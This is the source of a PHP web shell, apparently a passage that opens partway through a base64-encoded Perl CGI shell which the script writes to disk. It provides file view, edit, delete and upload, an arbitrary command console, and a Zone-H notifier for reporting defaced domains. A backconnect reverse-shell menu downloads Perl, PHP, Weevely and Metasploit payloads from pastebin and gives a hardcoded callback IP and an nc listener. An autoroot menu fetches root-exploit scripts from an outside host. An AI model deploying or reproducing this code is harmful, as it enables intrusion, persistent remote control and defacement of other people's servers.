S0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFZpZXcgTG9nCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFZpZXdMb2cKewoJaWYoJFdpbk5UKQoJewoJCXJldHVybiAiPGgyPjxmb250IHN0eWxlPSdmb250OiAyMHB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Eb24ndCBydW4gb24gV2luZG93czwvZm9udD48L2gyPiI7Cgl9CglteSAkcmVzdWx0PSI8dGFibGU+PHRyPjx0aD5QYXRoIExvZzwvdGg+PHRoPlN1Ym1pdDwvdGg+PC90cj4iOwoJbXkgQHBhdGhsb2c9KAoJCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3JfbG9nJywKCQkJCScvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2cnLAoJCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzX2xvZycKCQkJCSk7CglteSAkaT0wOwoJbXkgJHBlcm1zOwoJbXkgJHNsOwoJZm9yZWFjaCBteSAkbG9nIChAcGF0aGxvZykKCXsKCQlpZigtdyAkbG9nKQoJCXsKCQkJJHBlcm1zPSJPSyI7CgkJfWVsc2UKCQl7CgkJCWNob3AoJHNsID0gYGxuIC1zICRsb2cgZXJyb3JfbG9nXyRpYCk7CgkJCWlmKCZ0cmltKCRscykgZXEgIiIpCgkJCXsKCQkJCWlmKC1yICRscykKCQkJCXsKCQkJCQkkcGVybXM9Ik9LIjsKCQkJCQkkbG9nPSJlcnJvcl9sb2dfIi4kaTsKCQkJCX0KCQkJfWVsc2UKCQkJewoJCQkJJHBlcm1zPSI8Zm9udCBzdHlsZT0nY29sb3I6IHJlZDsnPkNhbmNlbDxmb250PiI7CgkJCX0KCQl9CgkJJHJlc3VsdCAuPTw8RU5EOwoJCTx0cj4KCgkJCTxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPgoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dfJGknKS52YWx1ZT0nbGVzcyAnICsgdGhpcy52YWx1ZTsiIHZhbHVlPSIkbG9nIiBzaXplPSc1MCcvPjwvdGQ+CgkJCTx0ZD48aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVHJ5IiAvPjwvdGQ+CgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJsb2dfJGkiIG5hbWU9ImMiIHZhbHVlPSJsZXNzICRsb2ciLz4KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiIC8+CgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciIgLz4KCQkJPC9mb3JtPgoJCQk8dGQ+JHBlcm1zPC90ZD4KCgkJPC90cj4KRU5ECgkJJGkrKzsKCX0KCSRyZXN1bHQgLj0iPC90YWJsZT4iOwoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIE1haW4gUHJvZ3JhbSAtIEV4ZWN1dGlvbiBTdGFydHMgSGVyZQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiZSZWFkUGFyc2U7CiZHZXRDb29raWVzOwoKJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsKJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9OwokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9OwokUnVuQ29tbWFuZCA9ICRpbnsnYyd9OwokVHJhbnNmZXJGaWxlID0gJGlueydmJ307CiRPcHRpb25zID0gJGlueydvJ307CiRBY3Rpb24gPSAkaW57J2EnfTsKCiRBY3Rpb24gPSAiY29tbWFuZCIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQKCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQKJEN1cnJlbnREaXIgPSAmdHJpbSgkaW57J2QnfSk7CiMgbWFjIGRpbmggeHVhdCB0aG9uZyB0aW4gbmV1IGtvIGNvIGxlbmggbmFvIQokUnVuQ29tbWFuZD0gJFdpbk5UPyJkaXIiOiJkaXIgLWxpYSIgaWYoJFJ1bkNvbW1hbmQgZXEgIiIpOwpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7CgokTG9nZ2VkSW4gPSAkQ29va2llc3snU0FWRURQV0QnfSBlcSAkUGFzc3dvcmQ7CgppZigkQWN0aW9uIGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgCQkjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luCnsKCSZQZXJmb3JtTG9naW47Cn1lbHNpZigkQWN0aW9uIGVxICJndWkiKSAjIEdVSSBkaXJlY3RvcnkKewoJJlByaW50UGFnZUhlYWRlcjsKCWlmKCEkV2luTlQpCgl7CgkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOwoJCWlmKCEoJGNobW9kIGVxIDApKQoJCXsKCQkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOwoJCQkkZmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kVHJhbnNmZXJGaWxlOwoJCQljaG9wKCRyZXN1bHQ9IGBjaG1vZCAkY2htb2QgIiRmaWxlImApOwoJCQlpZigmdHJpbSgkcmVzdWx0KSBlcSAiIikKCQkJewoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJCQl9ZWxzZQoJCQl7CgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJCQl9CgkJfQoJfQoJJHJlbmFtZT0kaW57J3JlbmFtZSd9OwoJaWYoISRyZW5hbWUgZXEgIiIpCgl7CgkJaWYocmVuYW1lKCRUcmFuc2ZlckZpbGUsJHJlbmFtZSkpCgkJewoJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7CgkJfWVsc2UKCQl7CgkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7CgkJfQoJfQoJJHJlbW92ZT0kaW57J3JlbW92ZSd9OwoJaWYoJHJlbW92ZSBuZSAiIikKCXsKCQkkcm0gPSAkQ3VycmVudERpci4kUGF0aFNlcC4kcmVtb3ZlOwoJCWlmKC1kICRybSkKCQl7CgkJCSZSbURpcigkcm0pOwoJCX1lbHNlCgkJewoJCQlpZih1bmxpbmsoJHJtKSkKCQkJewoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJCQl9ZWxzZQoJCQl7CgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJCQl9CQkJCgkJfQoJfQoJcHJpbnQgJkxpc3REaXI7Cgp9CmVsc2lmKCRBY3Rpb24gZXEgImNvbW1hbmQiKQkJCQkgCSMgdXNlciB3YW50cyB0byBydW4gYSBjb21tYW5kCnsKCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCXByaW50ICZFeGVjdXRlQ29tbWFuZDsKfQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUKewoJJlByaW50UGFnZUhlYWRlcjsKCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpCgl7CgkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJfWVsc2UKCXsKCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJfQoJcHJpbnQgJkxpc3REaXI7Cn0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgCQkJCQkjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQp7CgkmUHJpbnRQYWdlSGVhZGVyOwoKCXByaW50ICZVcGxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImJhY2tiaW5kIikgCQkJCSMgdXNlciB3YW50cyB0byBiYWNrIGNvbm5lY3Qgb3IgYmluZCBwb3J0CnsKCSZQcmludFBhZ2VIZWFkZXIoImNsaWVudHBvcnQiKTsKCXByaW50ICZCYWNrQmluZDsKfQplbHNpZigkQWN0aW9uIGVxICJicnV0ZWZvcmNlciIpIAkJCSMgdXNlciB3YW50cyB0byBicnV0ZSBmb3JjZQp7CgkmUHJpbnRQYWdlSGVhZGVyOwoJcHJpbnQgJkJydXRlRm9yY2VyOwp9ZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQp7CglwcmludCAmRG93bmxvYWRGaWxlOwp9ZWxzaWYoJEFjdGlvbiBlcSAiY2hlY2tsb2ciKSAJCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbG9nIGZpbGUKewoJJlByaW50UGFnZUhlYWRlcjsKCXByaW50ICZWaWV3TG9nOwoKfWVsc2lmKCRBY3Rpb24gZXEgImRvbWFpbnN1c2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbGlzdCB1c2VyL2RvbWFpbgp7CgkmUHJpbnRQYWdlSGVhZGVyOwoJcHJpbnQgJlZpZXdEb21haW5Vc2VyOwp9ZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgCQkJCSMgdXNlciB3YW50cyB0byBsb2dvdXQKewoJJlBlcmZvcm1Mb2dvdXQ7Cn0KJlByaW50UGFnZUZvb3Rlcjs=';
$file = fopen("cgi2012.izo" ,"w+");
$write = fwrite ($file ,base64_decode($cgi2012));
fclose($file);
chmod("cgi2012.izo",0755);
echo " <iframe src=cgi2012/cgi2012.izo width=96% height=76% frameborder=0></iframe>
</div>"; }
elseif(isset($_GET['x']) && ($_GET['x'] == 'zone-h')){?>
<form action="?y=<?php echo $pwd; ?>&amp;x=zone-h" method="post">
<br><br><? echo '<p style="text-align: center;"> <img alt="" src="http://www.zone-h.org/images/logo.gif" style="width: 261px; height: 67px;" /></p>
<center><span style="font-size:1.6em;"> .: Notifier :. </span></center><center><form action="" method="post"><input class="inputz" type="text" name="defacer" size="67" value="Aerul Da White-Hkc" /><br> <select class="inputz" name="hackmode">
<option>------------------------------------SELECT-------------------------------------</option>
<option style="background-color: rgb(0, 0, 0);" value="1">known vulnerability (i.e. unpatched system)</option>
<option style="background-color: rgb(0, 0, 0);" value="2" >undisclosed (new) vulnerability</option>
<option style="background-color: rgb(0, 0, 0);" value="3" >configuration / admin. mistake</option>
<option style="background-color: rgb(0, 0, 0);" value="4" >brute force attack</option>
<option style="background-color: rgb(0, 0, 0);" value="5" >social engineering</option>
<option style="background-color: rgb(0, 0, 0);" value="6" >Web Server intrusion</option>
<option style="background-color: rgb(0, 0, 0);" value="7" >Web Server external module intrusion</option>
<option style="background-color: rgb(0, 0, 0);" value="8" >Mail Server intrusion</option>
<option style="background-color: rgb(0, 0, 0);" value="9" >FTP Server intrusion</option>
<option style="background-color: rgb(0, 0, 0);" value="10" >SSH Server intrusion</option>
<option style="background-color: rgb(0, 0, 0);" value="11" >Telnet Server intrusion</option>
<option style="background-color: rgb(0, 0, 0);" value="12" >RPC Server intrusion</option>
<option style="background-color: rgb(0, 0, 0);" value="13" >Shares misconfiguration</option>
<option style="background-color: rgb(0, 0, 0);" value="14" >Other Server intrusion</option>
<option style="background-color: rgb(0, 0, 0);" value="15" >SQL Injection</option>
<option style="background-color: rgb(0, 0, 0);" value="16" >URL Poisoning</option>
<option style="background-color: rgb(0, 0, 0);" value="17" >File Inclusion</option>
<option style="background-color: rgb(0, 0, 0);" value="18" >Other Web Application bug</option>
<option style="background-color: rgb(0, 0, 0);" value="19" >Remote administrative panel access bruteforcing</option>
<option style="background-color: rgb(0, 0, 0);" value="20" >Remote administrative panel access password guessing</option>
<option style="background-color: rgb(0, 0, 0);" value="21" >Remote administrative panel access social engineering</option>
<option style="background-color: rgb(0, 0, 0);" value="22" >Attack against administrator(password stealing/sniffing)</option>
<option style="background-color: rgb(0, 0, 0);" value="23" >Access credentials through Man In the Middle attack</option>
<option style="background-color: rgb(0, 0, 0);" value="24" >Remote service password guessing</option>
<option style="background-color: rgb(0, 0, 0);" value="25" >Remote service password bruteforce</option>
<option style="background-color: rgb(0, 0, 0);" value="26" >Rerouting after attacking the Firewall</option>
<option style="background-color: rgb(0, 0, 0);" value="27" >Rerouting after attacking the Router</option>
<option style="background-color: rgb(0, 0, 0);" value="28" >DNS attack through social engineering</option>
<option style="background-color: rgb(0, 0, 0);" value="29" >DNS attack through cache poisoning</option>
<option style="background-color: rgb(0, 0, 0);" value="30" >Not available</option>
option style="background-color: rgb(0, 0, 0);" value="8" >_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _</option>
</select> <br>
<select class="inputz" name="reason">
<option >------------------------------------SELECT-------------------------------------</option>
<option style="background-color: rgb(0, 0, 0);" value="1" >Heh...just for fun!</option>
<option style="background-color: rgb(0, 0, 0);" value="2" >Revenge against that website</option>
<option style="background-color: rgb(0, 0, 0);" value="3" >Political reasons</option>
<option style="background-color: rgb(0, 0, 0);" value="4" >As a challenge</option>
<option style="background-color: rgb(0, 0, 0);" value="5" >I just want to be the best defacer</option>
<option style="background-color: rgb(0, 0, 0);" value="6" >Patriotism</option>
<option style="background-color: rgb(0, 0, 0);" value="7" >Not available</option>
option style="background-color: rgb(0, 0, 0);" value="8" >_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _</option>
</select> <br>
<textarea class="inputz" name="domain" cols="90" rows="20" >List Of Domains, 20 Rows.</textarea><br>
<input class="inputz" type="submit" value=" Send Now !! " name="SendNowToZoneH"/>
</form>'; ?>
<?
echo "</form></center>";?>
<?
function ZoneH($url, $hacker, $hackmode,$reson, $site )
{
$k = curl_init();
curl_setopt($k, CURLOPT_URL, $url);
curl_setopt($k,CURLOPT_POST,true);
curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
$kubra = curl_exec($k);
curl_close($k);
return $kubra;
}
{
ob_start();
$sub = @get_loaded_extensions();
if(!in_array("curl", $sub))
{
die('<center><b>[-] Curl Is Not Supported !![-]</b></center>');
}
$hacker = $_POST['defacer'];
$method = $_POST['hackmode'];
$neden = $_POST['reason'];
$site = $_POST['domain'];
if (empty($hacker))
{
die ("<center><b>[+] YOU MUST FILL THE ATTACKER NAME [+]</b></center>");
}
elseif($method == "--------SELECT--------")
{
die("<center><b>[+] YOU MUST SELECT THE METHOD [+]</b></center>");
}
elseif($neden == "--------SELECT--------")
{
die("<center><b>[+] YOU MUST SELECT THE REASON [+]</b></center>");
}
elseif(empty($site))
{
die("<center><b>[+] YOU MUST INTER THE SITES LIST [+]</b></center>");
}
$i = 0;
$sites = explode("\n", $site);
while($i < count($sites))
{
if(substr($sites[$i], 0, 4) != "http")
{
$sites[$i] = "http://".$sites[$i];
}
ZoneH("http://www.zone-h.com/notify/single", $hacker, $method, $neden, $sites[$i]);
echo "Domain : ".$sites[$i]." Defaced Last Years !";
++$i;
}
echo "[+] Sending Sites To Zone-H Has Been Completed Successfully !!![+]";
}
?>
<?php }


/////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'phpinfo'))
{
@ob_start();
@eval("phpinfo();");
$buff = @ob_get_contents();
@ob_end_clean();
$awal = strpos($buff,"<body>")+6;
$akhir = strpos($buff,"</body>");
echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>";
}
/////////////////////////////////////////////////
elseif(isset($_GET['view']) && ($_GET['view'] != ""))
{
if(is_file($_GET['view']))
{
if(!isset($file)) $file = magicboom($_GET['view']);
if(!$win && $posix)
{
$name=@posix_getpwuid(@fileowner($file));
$group=@posix_getgrgid(@filegroup($file));
$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
}
else { $owner = $user; }
$filn = basename($file);
echo "<table style=\"margin:6px 0 0 2px;line-height:20px;\">
<tr>
<td>Filename</td>
<td>
<span id=\"".clearspace($filn)."_link\">".$file."</span>
<form action=\"?y=".$pwd."&amp;view=$file\" method=\"post\" id=\"".clearspace($filn)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
<input type=\"hidden\" name=\"oldname\" value=\"".$filn."\" style=\"margin:0;padding:0;\" />
<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$filn."\" />
<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\"
onclick=\"tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\" />
</form>
</td>
</tr>
<tr>
<td>Size</td>
<td>".ukuran($file)."</td>
</tr>
<tr>
<td>Permission</td>
<td>".get_perms($file)."</td>
</tr>
<tr>
<td>Owner</td>
<td>".$owner."</td>
</tr>
<tr>
<td>Create time</td>
<td>".date("d-M-Y H:i",@filectime($file))."</td>
</tr>
<tr>
<td>Last modified</td>
<td>".date("d-M-Y H:i",@filemtime($file))."</td>
</tr>
<tr>
<td>Last accessed</td>
<td>".date("d-M-Y H:i",@fileatime($file))."</td>
</tr>
<tr>
<td>Actions</td>
<td><a href=\"?y=$pwd&amp;edit=$file\">edit</a>
| <a href=\"javascript:tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\">rename</a>
| <a href=\"?y=$pwd&amp;delete=$file\">delete</a>
| <a href=\"?y=$pwd&amp;dl=$file\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$file\">gz</a>)
</td>
</tr>
<tr>
<td>View</td>
<td><a href=\"?y=".$pwd."&amp;view=".$file."\">text</a>
| <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=code\">code</a>
| <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=image\">img</a>
</td>
</tr>
</table> ";
if(isset($_GET['type']) && ($_GET['type']=='image'))
{ echo "<div style=\"text-align:center;margin:8px;\"><img src=\"?y=".$pwd."&amp;img=".$filn."\"></div>"; }
elseif(isset($_GET['type']) && ($_GET['type']=='code'))
{ echo "<div class=\"viewfile\">"; $file = wordwrap(@file_get_contents($file),"240","\n"); @highlight_string($file); echo "</div>"; }
else { echo "<div class=\"viewfile\">"; echo nl2br(htmlentities((@file_get_contents($file)))); echo "</div>"; }
}
elseif(is_dir($_GET['view'])){ echo showdir($pwd,$prompt); }
}
elseif(isset($_GET['edit']) && ($_GET['edit'] != ""))
{
if(isset($_POST['save']))
{
$file = $_POST['saveas'];
$content = magicboom($_POST['content']);
if($filez = @fopen($file,"w"))
{
$time = date("d-M-Y H:i",time());
if(@fwrite($filez,$content)) $msg = "file saved <span class=\"gaya\">@</span> ".$time;
else $msg = "failed to save"; @fclose($filez);
}
else $msg = "permission denied";
}
if(!isset($file)) $file = $_GET['edit'];
if($filez = @fopen($file,"r"))
{
$content = "";
while(!feof($filez))
{
$content .= htmlentities(str_replace("''","'",fgets($filez)));
}
@fclose($filez);
} ?>
<form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo $file; ?>" method="post">
<table class="cmdbox">
<tr>
<td colspan="2">
<textarea class="output" name="content"> <?php echo $content; ?> </textarea>
</td>
<tr>
<td colspan="2">Save as <input onMouseOver="" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" />
<input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /> &nbsp;<?php echo $msg; ?>
</td>
</tr>
</table>
</form>
<?php
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'upload'))
{
if(isset($_POST['uploadcomp']))
{
if(is_uploaded_file($_FILES['file']['tmp_name']))
{
$path = magicboom($_POST['path']);
$fname = $_FILES['file']['name'];
$tmp_name = $_FILES['file']['tmp_name'];
$pindah = $path.$fname;
$stat = @move_uploaded_file($tmp_name,$pindah);
if ($stat) { $msg = "file uploaded to $pindah"; }
else $msg = "failed to upload $fname";
}
else $msg = "failed to upload $fname";
}
elseif(isset($_POST['uploadurl']))
{
$pilihan = trim($_POST['pilihan']);
$wurl = trim($_POST['wurl']);
$path = magicboom($_POST['path']);
$namafile = download($pilihan,$wurl);
$pindah = $path.$namafile;
if(is_file($pindah)) { $msg = "file uploaded to DIR $pindah"; }
else $msg = "failed ! to upload $namafile"; }
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post">
<table class="tabnet" style="width:320px;padding:0 1px;">
<tr>
<th colspan="2">Upload from computer</th>
</tr>
<tr>
<td colspan="2">
<p style="text-align:center;">
<input style="color:#000000;" type="file" name="file" />
<input type="submit" name="uploadcomp" class="inputzbut" value="Go !" style="width:80px;">
</p>
</td>
</tr>
<tr>
<td colspan="2">
<input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" />
</td>
</tr>
</table>
</form>
<table class="tabnet" style="width:320px;padding:0 1px;">
<tr>
<th colspan="2">Upload from url</th>
</tr>
<tr>
<td colspan="2">
<form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=upload">
<table>
<tr>
<td>url</td>
<td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"></td>
</tr>
<tr>
<td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td>
</tr>
<tr>
<td>
<select size="1" class="inputz" name="pilihan">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wlinks">links</option>
<option value="wget">GET</option>
<option value="wcurl">curl</option>
</select>
</td>
<td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go !" style="width:246px;"></td>
</tr>
</table>
</form>
</td>
</tr>
</table>
<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
<?php }


///////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'backconnect'))
    {
    ?>
	<center><br><br><b>+--=[ Backconnect Reverse Shell ]=--+</b><br>
		<form method="post" action="">
<table class="tabnet" border="1" >
<tr>
		<td align="center">Choose Backconnect</td><td align="center">Command</td>
	</tr>
	<tr>
		<td><form method="post" action="">&nbsp;
	Pilih => &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
	<select class="inputzbut" name="pilih" id="pilih">
	<option value="back1" > Perl Backconnect </option>
	<option value="back2"> Php Backconnect </option>
	<option value="back3"> Weevely </option>
	<option value="back4"> Php Metasploit </option>
	</select>
	<input  type="submit" name="submit" class="inputzbut" value="Create">	
	<br>
	<br>
	<br>edit pada source script back.pl 
	<br>my $ip = '222.255.167.45'; // CHANGE THIS
	<br>my $port = '57899'; // CHANGE THIS
	<br> <br>
	<br>edit pada source script back.php 
	<br>$ip = '222.255.167.45'; // CHANGE THIS
	<br>$port = 57899; // CHANGE THIS
	<br>
	<br>edit pada source script back.pl 
	<br>my $ip = '222.255.167.45'; // CHANGE THIS
	<br>my $port = '57899'; // CHANGE THIS
	<br>
	<br>edit pada source script meter.php 
	<br>$ip = '222.255.167.45'; // CHANGE THIS
	<br>$port = 57899; // CHANGE THIS
	<br>
	<br>usage : nc -lvvp 57899
	</td>
	</form>
	
<td>
<table class="cmdbox">
<tr>
<textarea style='background:black;outline:none;' name='cmd' rows='12' cols='67'>
<?php if(isset($_POST['submitcmd'])) { echo @exe($_POST['cmd']); } ?> </textarea>
</td>
</tr>
<tr>
<td colspan="2"><?php echo $prompt; ?>
<input onMouseOver="" id="cmd" class="inputz" type="text" name="cmd"  value="perl back.pl" /><center><br>
<input class="inputzbut" type="submit" value="Execute" name="submitcmd" />
</td>
</tr>
</table></center>
</form> </td></tr></table><br><br>
<?php
$submit = $_POST ['submit'];
if(isset($submit)) {
	$pilih = $_POST['pilih'];
		if ( $pilih == 'back1') {
		$file = file_get_contents('http://pastebin.com/raw.php?i=aBHs2nWR');
		$IIIIIIIIl11I = fopen('back.pl','w');
		chmod("back.pl",0755);
		fwrite($IIIIIIIIl11I,$file);
		fclose($IIIIIIIIl11I);
		print '<br>
		<center><blink><b>Backconnect telah diluncurkan Boss.... <br> Done !!</blink><br><br>[ <a href="back.pl" target="_blank"> back.pl</a> ] </b></center>';
		}
		elseif ( $pilih == 'back2') {
		$file = file_get_contents('http://pastebin.com/raw.php?i=mGSK1EEa');
		$IIIIIIIIl11I = fopen('back.php','w');
		chmod("back.php",0755);
		fwrite($IIIIIIIIl11I,$file);
		fclose($IIIIIIIIl11I);
		print '<br>
		<center><blink><b>Backconnect telah diluncurkan Boss.... <br> Done !!</blink><br><br>[ <a href="back.php" target="_blank"> back.php</a> ] </b></center>';
		}

		elseif ( $pilih == 'back3') {
		$file = file_get_contents('http://pastebin.com/raw.php?i=ctQsPjpn');
		$IIIIIIIIl11I = fopen('wy.php','w');
		chmod("wy.php",0755);
		fwrite($IIIIIIIIl11I,$file);
		fclose($IIIIIIIIl11I);
		print '<br>
		<center><blink><b>Weevely telah diluncurkan Boss....  <br>usage : weevely http://site.com/wy.php aerulcyber <br><br>[ <a href="wy.php" target="_blank"> wy.php</a> ] </b></center>';
		}

		elseif ( $pilih == 'back4') {
		$file = file_get_contents('http://pastebin.com/raw.php?i=gtTLMyya');
		$IIIIIIIIl11I = fopen('meter.php','w');
		chmod("meter.php",0755);
		fwrite($IIIIIIIIl11I,$file);
		fclose($IIIIIIIIl11I);
		print '<br>
		<center><blink><b>Tools telah diluncurkan Boss....  <br> Done !!</blink><br><br>[ <a href="meter.php" target="_blank"> meter.php</a> ] </b></center>';
		}
		
}

}	
//////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'autoroot'))
    {
    ?>
	<center><br><br><b>+--=[ Autoroot Perl ]=--+</b><br>
		<form method="post" action="">
<table class="tabnet" border="1" >
<tr>

		<td><form method="post" action="">&nbsp;
	Pilih => &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
	<select class="inputzbut" name="pilih" id="pilih">
	<option value="autoroot1" > Perl autoroot1 </option>
	<option value="autoroot2"> Perl autoroot2 </option>
	</select>
	<input  type="submit" name="submit" class="inputzbut" value="Create">	
	<br>
	<br>
	</td>
	</form>
	
</td></tr></table><br><br>
<?php
$submit = $_POST ['submit'];
if(isset($submit)) {
	$pilih = $_POST['pilih'];
		if ( $pilih == 'autoroot1') {
		mkdir('auto',0777);
		$file = file_get_contents('http://svchost.nazuka.net/a.txt');
		$IIIIIIIIl11I = fopen('auto/auto.pl','w');
		chmod("auto/auto.pl",0777);
		fwrite($IIIIIIIIl11I,$file);
		fclose($IIIIIIIIl11I);
		print '<br>
		<center><blink><b>autoroot telah diluncurkan Boss.... <br> Done !!</blink><br><br>[ <a href="auto/auto.pl" target="_blank"> auto.pl</a> ] </b></center>';
		}
		elseif ( $pilih == 'autoroot2') {
		$file = file_get_contents('http://svchost.nazuka.net/b.txt');
		$IIIIIIIIl11I = fopen('auto/auto2.pl','w');
		chmod("auto/auto2.pl",0755);
		fwrite($IIIIIIIIl11I,$file);
		fclose($IIIIIIIIl11I);
		print '<br>
		<center><blink><b>autoroot2 telah diluncurkan Boss.... <br> Done !!</blink><br><br>[ <a href="auto/auto2.pl" target="_blank"> auto2.pl</a> ] </b></center>';

		}
		
}

}	
//////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'shell'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post">
<table class="cmdbox">
<tr>
<td colspan="2">
<textarea class="output" readonly> <?php if(isset($_POST['submitcmd'])) { echo @exe($_POST['cmd']); } ?> </textarea>
</td>
</tr>
<tr>
<td colspan="2"><?php echo $prompt; ?>
<input onMouseOver="" id="cmd" class="inputz" type="text" name="cmd" style="width:100%;" value="" />
<input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" />
</td>
</tr>
</table>
</form> <?php
}
else
{
if(isset($_GET['delete']) && ($_GET['delete'] != ""))
{
$file = $_GET['delete']; @unlink($file);
}
elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != ""))
{
@rmdir(rtrim($_GET['fdelete'],DIRECTORY_SEPARATOR));
}
elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != ""))
{
